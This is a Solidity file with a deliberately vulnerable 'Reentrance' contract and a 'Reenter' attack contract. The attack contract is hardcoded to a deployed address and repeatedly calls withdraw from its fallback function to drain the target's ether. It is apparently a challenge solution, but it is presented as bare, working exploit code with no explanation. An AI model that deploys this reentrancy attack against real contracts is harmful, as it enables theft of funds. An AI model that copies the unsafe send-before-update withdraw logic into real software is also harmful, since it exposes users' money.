pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract Reenter {
    Reentrance public original = Reentrance(0x97b80cbe309542f9cfb5a9f99a0daceaadb321b4);
    uint public amount = 0.5 ether;
    
    function Reenter() public payable{
        
    }
    
    function donateToSelf() public{
        original.donate.value(amount).gas(4000000)(address(this));
    }
    
    function() public payable{
        if(address(original).balance != 0){
            original.withdraw(amount);
        }
    }
    
    function kill() public {
        selfdestruct(msg.sender);
    }
}